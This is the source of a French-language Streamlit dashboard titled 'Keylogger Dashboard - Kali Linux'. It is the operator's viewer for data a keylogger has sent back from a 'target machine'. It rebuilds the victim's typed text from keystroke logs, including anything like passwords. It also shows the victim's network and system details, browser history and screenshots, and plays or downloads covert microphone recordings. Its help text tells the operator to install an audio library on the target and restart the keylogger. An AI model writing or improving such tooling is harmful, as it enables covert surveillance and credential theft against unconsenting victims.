import streamlit as st
import pandas as pd
from pathlib import Path
import time
import json
import re
import base64
import tempfile
import os

# Configuration de la page
st.set_page_config(
    page_title="Keylogger Dashboard",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="expanded"
)

class FixedDashboard:
    def __init__(self):
        self.data_dir = Path.home() / 'received_data'
    
    def get_sessions(self):
        """Retourne les sessions disponibles"""
        sessions = []
        if self.data_dir.exists():
            for session_dir in self.data_dir.iterdir():
                if session_dir.is_dir() and session_dir.name.startswith('Session_'):
                    sessions.append(session_dir)
        
        sessions.sort(key=lambda x: x.name, reverse=True)
        return sessions
    
    def count_files_in_session(self, session_dir):
        """Compte les fichiers dans une session"""
        count = 0
        if session_dir.exists():
            for item in session_dir.rglob('*'):
                if item.is_file():
                    count += 1
        return count
    
    def display_dashboard(self):
        """Affiche le tableau de bord principal"""
        st.title("🔍 Keylogger Dashboard - Kali Linux")
        
        # Auto-rafraîchissement
        refresh_rate = st.sidebar.selectbox("🔄 Rafraîchissement (secondes)", [2, 5, 10, 30], index=1)
        
        if st.sidebar.button("🔄 Rafraîchir Maintenant"):
            st.rerun()
        
        sessions = self.get_sessions()
        
        # Métriques
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            st.metric("Sessions", len(sessions))
        
        with col2:
            total_files = sum(self.count_files_in_session(s) for s in sessions)
            st.metric("Fichiers", total_files)
        
        with col3:
            if sessions:
                latest_timestamp = sessions[0].name.replace('Session_', '')
                from datetime import datetime
                try:
                    dt = datetime.fromtimestamp(int(latest_timestamp))
                    st.metric("Dernière", dt.strftime("%H:%M:%S"))
                except:
                    st.metric("Dernière", latest_timestamp)
            else:
                st.metric("Dernière", "---")
        
        with col4:
            st.metric("Statut", "🟢 Actif" if sessions else "🟡 En attente")
        
        if not sessions:
            st.warning("📭 Aucune donnée reçue pour le moment")
            time.sleep(refresh_rate)
            st.rerun()
            return
        
        # Sélection de session
        session_options = []
        for session in sessions:
            file_count = self.count_files_in_session(session)
            timestamp = session.name.replace('Session_', '')
            from datetime import datetime
            try:
                dt = datetime.fromtimestamp(int(timestamp))
                display_time = dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                display_time = timestamp
            
            session_options.append(f"{display_time} ({file_count} fichiers)")
        
        selected = st.selectbox("📂 Choisir une session à analyser:", session_options)
        session_index = session_options.index(selected)
        selected_session = sessions[session_index]
        
        # Affichage des données
        self.display_session_data(selected_session)
        
        # Auto-rafraîchissement
        time.sleep(refresh_rate)
        st.rerun()
    
    def display_session_data(self, session_dir):
        """Affiche les données d'une session"""
        st.markdown("---")
        
        timestamp = session_dir.name.replace('Session_', '')
        from datetime import datetime
        try:
            dt = datetime.fromtimestamp(int(timestamp))
            display_time = dt.strftime("%Y-%m-%d à %H:%M:%S")
        except:
            display_time = timestamp
        
        st.subheader(f"📊 Session du {display_time}")
        
        # Création des onglets
        tab_names = ["📋 Vue d'ensemble", "⌨ Logs Clavier", "🌐 Réseau", "💻 Système", "🔍 Navigateur", "🖼 Screenshots", "🎵 Audio FIX"]
        tabs = st.tabs(tab_names)
        
        with tabs[0]:
            self.display_overview(session_dir)
        with tabs[1]:
            self.display_key_logs(session_dir)
        with tabs[2]:
            self.display_network_info(session_dir)
        with tabs[3]:
            self.display_system_info(session_dir)
        with tabs[4]:
            self.display_browser_info(session_dir)
        with tabs[5]:
            self.display_screenshots(session_dir)
        with tabs[6]:
            self.display_audio_fixed(session_dir)  # Nouvelle version corrigée
    
    def display_overview(self, session_dir):
        """Aperçu de la session"""
        st.subheader("📊 Statistiques de la Session")
        
        main_data_dir = session_dir / "main_data"
        screenshots_dir = session_dir / "screenshots"
        audio_dir = session_dir / "audio"
        
        txt_files = []
        image_files = []
        audio_files = []
        
        if main_data_dir.exists():
            for file in main_data_dir.rglob('*'):
                if file.is_file():
                    if file.suffix == '.txt':
                        txt_files.append(file)
                    elif file.suffix in ['.mp4', '.wav', '.mp3']:
                        audio_files.append(file)
        
        if screenshots_dir.exists():
            for file in screenshots_dir.rglob('*'):
                if file.is_file() and file.suffix.lower() in ['.png', '.jpg', '.jpeg']:
                    image_files.append(file)
        
        if audio_dir.exists():
            for file in audio_dir.rglob('*'):
                if file.is_file() and file.suffix.lower() in ['.wav', '.mp4', '.mp3']:
                    audio_files.append(file)
        
        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("📄 Textes", len(txt_files))
        with col2:
            st.metric("🖼 Images", len(image_files))
        with col3:
            st.metric("🎵 Audio", len(audio_files))
        with col4:
            st.metric("📦 Total", len(txt_files) + len(image_files) + len(audio_files))
        
        # Structure des fichiers
        st.subheader("📁 Structure des Fichiers")
        
        if main_data_dir.exists():
            st.write("**📦 Données Principales:**")
            for file in sorted(main_data_dir.rglob('*')):
                if file.is_file():
                    size = file.stat().st_size
                    icon = "📄" if file.suffix == '.txt' else "🎵" if file.suffix in ['.mp4', '.wav', '.mp3'] else "📁"
                    st.write(f"{icon} `{file.name}` ({size} octets)")
    
    def read_file(self, file_path):
        """Lit un fichier avec gestion d'erreur"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception as e:
            return f"❌ Erreur lecture: {e}"
    
    def find_file_in_session(self, session_dir, pattern):
        """Trouve un fichier dans la session"""
        main_data_dir = session_dir / "main_data"
        if main_data_dir.exists():
            for file in main_data_dir.rglob(pattern):
                if file.is_file():
                    return file
        return None
    
    def display_key_logs(self, session_dir):
        """Affiche les logs clavier"""
        key_file = self.find_file_in_session(session_dir, "*key_log*")
        if not key_file:
            st.warning("Aucun fichier de logs clavier trouvé")
            return
        
        content = self.read_file(key_file)
        
        if "❌ Erreur lecture" in content:
            st.error(content)
            return
        
        lines = [line for line in content.split('\n') if line.strip()]
        st.metric("Lignes de log", len(lines))
        
        # Reconstruction du texte
        st.subheader("📝 Texte Reconstitué")
        typed_text = []
        for line in lines:
            if '-' in line:
                try:
                    _, key_event = line.split('-', 1)
                    key_clean = key_event.strip()
                    
                    if key_clean.startswith("'") and key_clean.endswith("'"):
                        char = key_clean[1:-1]
                        if len(char) == 1:
                            typed_text.append(char)
                    elif key_clean == '[ESPACE]':
                        typed_text.append(' ')
                    elif key_clean == '[ENTREE]':
                        typed_text.append('\n')
                    elif key_clean == '[RETOUR]':
                        if typed_text:
                            typed_text.pop()
                except:
                    pass
        
        reconstructed = ''.join(typed_text)
        if reconstructed.strip():
            st.text_area("Texte tapé (reconstitué)", reconstructed, height=200, key="reconstructed_text")
        else:
            st.info("Aucun texte reconstituable")
    
    def display_network_info(self, session_dir):
        """Affiche les infos réseau"""
        network_file = self.find_file_in_session(session_dir, "*network*")
        if not network_file:
            st.warning("Aucune information réseau trouvée")
            return
        
        content = self.read_file(network_file)
        
        if "❌ Erreur lecture" in content:
            st.error(content)
            return
        
        st.subheader("🌐 Informations Réseau")
        st.text_area("Détails réseau", content, height=400, key="network_details")
    
    def display_system_info(self, session_dir):
        """Affiche les infos système"""
        system_file = self.find_file_in_session(session_dir, "*system*")
        if not system_file:
            st.warning("Aucune information système trouvée")
            return
        
        content = self.read_file(system_file)
        
        if "❌ Erreur lecture" in content:
            st.error(content)
            return
        
        st.subheader("💻 Informations Système")
        st.text_area("Détails système complets", content, height=400, key="system_details")
    
    def display_browser_info(self, session_dir):
        """Affiche l'historique navigateur"""
        browser_file = self.find_file_in_session(session_dir, "*browser*")
        if not browser_file:
            st.warning("Aucun historique navigateur trouvé")
            return
        
        content = self.read_file(browser_file)
        
        if "❌ Erreur lecture" in content:
            st.error(content)
            return
        
        st.subheader("🌐 Historique Navigateur")
        
        try:
            data = json.loads(content)
            if isinstance(data, dict):
                if 'history' in data and isinstance(data['history'], dict):
                    for browser, history in data['history'].items():
                        with st.expander(f"**{browser}** ({len(history)} entrées)"):
                            if history:
                                for i, entry in enumerate(history[:10]):
                                    if isinstance(entry, list) and len(entry) >= 2:
                                        st.write(f"{i+1}. **URL:** {entry[0]}")
                                        st.write(f"   **Titre:** {entry[1]}")
                                    else:
                                        st.write(f"{i+1}. {entry}")
                            else:
                                st.info("Aucune entrée d'historique")
            else:
                st.text_area("Données brutes", content, height=400)
        except:
            st.text_area("Données brutes", content, height=400)
    
    def display_screenshots(self, session_dir):
        """Affiche les screenshots"""
        screenshots_dir = session_dir / "screenshots"
        
        if not screenshots_dir.exists():
            st.info("Aucun dossier screenshots trouvé")
            return
        
        screenshot_files = []
        for file in screenshots_dir.rglob('*'):
            if file.is_file() and file.suffix.lower() in ['.png', '.jpg', '.jpeg']:
                screenshot_files.append(file)
        
        if not screenshot_files:
            st.info("Aucune capture d'écran trouvée")
            return
        
        st.subheader(f"🖼 Captures d'écran ({len(screenshot_files)} images)")
        
        for i, screenshot in enumerate(sorted(screenshot_files)):
            st.image(str(screenshot), 
                    caption=f"{screenshot.name} ({screenshot.stat().st_size} octets)", 
                    use_container_width=True)
            
            if i < len(screenshot_files) - 1:
                st.markdown("---")

    def display_audio_fixed(self, session_dir):
        """Affiche les fichiers audio avec corrections GStreamer"""
        st.subheader("🎵 Enregistrements Audio - Version Corrigée")
        
        # Recherche de fichiers audio
        audio_locations = [
            session_dir / "audio",
            session_dir / "main_data",
            session_dir
        ]
        
        audio_files = []
        for location in audio_locations:
            if location.exists():
                for file in location.rglob('*'):
                    if file.is_file() and file.suffix.lower() in ['.wav', '.mp3', '.mp4', '.ogg']:
                        audio_files.append(file)
        
        if not audio_files:
            st.info("🔇 Aucun fichier audio trouvé")
            st.info("""
            **Pour activer l'audio:**
            1. ✅ Vérifiez que `sounddevice` est installé sur la machine cible
            2. 🎤 Assurez-vous qu'un microphone est disponible
            3. 🔄 Redémarrez le keylogger
            """)
            return
        
        st.success(f"🎵 {len(audio_files)} fichier(s) audio trouvé(s)")
        
        for audio_file in sorted(audio_files):
            st.markdown("---")
            st.subheader(f"🔊 {audio_file.name}")
            
            file_size = audio_file.stat().st_size
            st.write(f"**Taille:** {file_size} octets")
            st.write(f"**Emplacement:** `{audio_file.relative_to(session_dir)}`")
            
            # Lecture audio avec gestion d'erreur GStreamer
            try:
                # Méthode 1: Lecture directe
                with open(audio_file, 'rb') as f:
                    audio_bytes = f.read()
                
                # Déterminer le format
                file_ext = audio_file.suffix.lower()
                mime_types = {
                    '.wav': 'audio/wav',
                    '.mp3': 'audio/mp3',
                    '.mp4': 'audio/mp4',
                    '.ogg': 'audio/ogg'
                }
                mime_type = mime_types.get(file_ext, 'audio/wav')
                
                # Essayer la lecture normale
                try:
                    st.audio(audio_bytes, format=mime_type)
                    st.success("✅ Lecture audio réussie")
                except Exception as audio_error:
                    st.warning(f"⚠ Erreur lecture: {audio_error}")
                    
                    # Méthode 2: Conversion temporaire
                    st.info("🔄 Tentative de conversion...")
                    self.try_audio_conversion(audio_file, audio_bytes)
                
                # Téléchargement garanti
                st.download_button(
                    label=f"📥 Télécharger {audio_file.name}",
                    data=audio_bytes,
                    file_name=audio_file.name,
                    mime=mime_type
                )
                
            except Exception as e:
                st.error(f"❌ Erreur: {e}")
    
    def try_audio_conversion(self, audio_file, original_bytes):
        """Tente de convertir l'audio pour contourner GStreamer"""
        try:
            # Vérifier si ffmpeg est disponible
            import subprocess
            result = subprocess.run(['which', 'ffmpeg'], capture_output=True, text=True)
            
            if result.returncode == 0:
                st.info("🔄 Conversion avec ffmpeg...")
                
                # Créer un fichier temporaire
                with tempfile.NamedTemporaryFile(suffix=audio_file.suffix, delete=False) as temp_input:
                    temp_input.write(original_bytes)
                    temp_input.flush()
                    
                    # Convertir en MP3
                    temp_output = tempfile.NamedTemporaryFile(suffix='.mp3', delete=False)
                    temp_output.close()
                    
                    cmd = [
                        'ffmpeg', '-i', temp_input.name,
                        '-acodec', 'libmp3lame',
                        '-b:a', '192k',
                        '-y',  # Overwrite
                        temp_output.name
                    ]
                    
                    result = subprocess.run(cmd, capture_output=True, timeout=30)
                    
                    if result.returncode == 0:
                        with open(temp_output.name, 'rb') as f:
                            converted_bytes = f.read()
                        
                        st.audio(converted_bytes, format='audio/mp3')
                        st.success("✅ Conversion réussie en MP3")
                        
                        st.download_button(
                            label="📥 Télécharger version MP3",
                            data=converted_bytes,
                            file_name=audio_file.stem + '.mp3',
                            mime='audio/mp3'
                        )
                    
                    # Nettoyage
                    os.unlink(temp_input.name)
                    if os.path.exists(temp_output.name):
                        os.unlink(temp_output.name)
                        
            else:
                st.warning("ffmpeg non disponible - impossible de convertir")
                
        except Exception as conv_error:
            st.error(f"❌ Échec conversion: {conv_error}")

def main():
    dashboard = FixedDashboard()
    dashboard.display_dashboard()

if __name__ == '__main__':
    main()
            